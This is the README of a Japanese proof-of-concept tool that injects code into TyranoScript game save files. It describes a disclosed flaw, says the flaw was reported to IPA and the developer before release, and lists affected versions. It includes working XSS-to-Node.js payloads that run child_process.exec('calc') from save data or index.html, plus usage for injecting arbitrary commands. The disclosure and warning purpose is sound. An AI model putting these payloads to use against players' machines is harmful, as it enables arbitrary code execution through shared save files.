# TyranoKiller
👻 TyranoScript(Tyrano シリーズ)のテスト用コードインジェクションツール  
![main.png](images/main.png)  
CVE-XXXX-XXXX (0day)  

**⚠他者から受け取ったセーブデータファイルや開発データの利用は大変危険です!!!!⚠**  

本脆弱性は[独立行政法人情報処理推進機構(IPA)](https://www.ipa.go.jp/)及び開発者に報告を行った後、365日の期間を開けて公開されました。
脆弱性に該当しない可能性がある/セキュリティリスクとなりうる部分を修正したとの返答を受け取っており、注意喚起及び同様の脆弱性作りこみの防止を目的として開示します。
本PoCはユーザへの注意喚起と、ユーザ自身が作成したゲームの脆弱性を調査する目的でのみの利用が許可され、攻撃への転用は禁止されています。
また、他者の作成したゲームに本PoCを使用することは、法律で禁止されている場合がありますのでご注意ください。  
ツール名はジョークです(恐竜の🍖食べてみたいよね)。

## Vulnerability
以下に示すツール/バージョンを用いて開発されたすべてのゲームに、セーブデータファイル経由の脆弱性が存在します。
- TyranoScriptV5 <= 5.04b  
- TyranoScript <= 4.83  

攻撃者はセーブデータファイル内に埋め込まれたHTMLタグを経由して、JavaScriptからNode.jsの全機能を利用し、任意のコードを実行することができます。
これにより被害者は、配布されているセーブデータを読み込むだけで、悪意のあるコードの脅威にさらされることとなります。
また、ゲームの開発データである`index.html`を経由しても同様であり、対象のソフトウェア(ツール)/バージョンは以下になります。
- TyranoBuilder <= 1.87b  
- TyranoBuilderV5 <= 2.02  
- TyranoRider <= 2.20  
- TyranoStudio <= 1.10d  
- (TyranoScriptV5 <= 5.11d)  
- (TyranoScript <= 4.88)  

本PoCにはindex.htmlにコードをインジェクションするテスト機能はありませんが、以下のコードを埋め込んだゲームを開発者としてプレビューすると、XSSから任意のコードが実行されます。
```html
<script>
require("child_process").exec("calc");
</script>
```

### Payload
脆弱性調査はオリジナルのゲームセーブデータを利用せずに再現することができます。
他者のゲームにおいて調査を行う場合は、以下を利用することでセーブデータ改変の著作権諸問題を回避できます。
以下のセーブデータは、すべてのゲームのセーブデータパターンにマッチします。
```json
{
    "kind":"save",
    "data":[{
        "title":"<script>require('child_process').exec('calc');</script>"
    }]
}
```

### Demo
![calc.gif](images/calc.gif)  
(サンプルゲーム引用元: https://tyrano.jp/)  

## Usage
```bash
usage: tyranokiller.py [-h] [-c COMMAND] filename

positional arguments:
  filename              Specify the target sav file name

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Specify the command to be injected
```
デフォルトでは`calc`が実行されます。
コードはセーブデータの先頭のセーブに反映されます。

**コード`alert('Injected_by_TyranoKiller_!!!!');`は悪用を防ぐために付加されており、削除を禁止します。**
